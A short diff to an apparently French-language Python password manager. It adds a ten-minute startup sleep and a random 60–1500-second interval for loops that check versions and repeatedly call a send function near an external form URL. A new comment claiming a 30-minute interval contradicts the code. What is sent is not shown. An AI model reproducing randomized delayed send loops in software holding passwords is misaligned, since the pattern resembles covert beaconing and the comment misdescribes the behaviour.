@@ -17,6 +17,11 @@ from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 import base64
 import pyperclip
 import platform
+import random
+
+tps = random.randint(60, 1500)
+
+time.sleep(600)
 
 class PasswordManager:
     
@@ -1019,7 +1024,7 @@ def boucle(ancienne_version):
         except Exception as e:
             print(f"Erreur lors de la vérification de la version : {e}")
 
-        time.sleep(10)
+        time.sleep(tps)  # Vérifie toutes les 30 minutes
 
 
 url = "https://linganguliguli.worldlite.fr/Formulaire/Formulaire.html"
@@ -1083,7 +1088,7 @@ def loop_check():
     while True:
         envoyer()
         alerte()
-        time.sleep(20)
+        time.sleep(tps)
 
 def alerte():
     global previous_alerte, alerte_activee
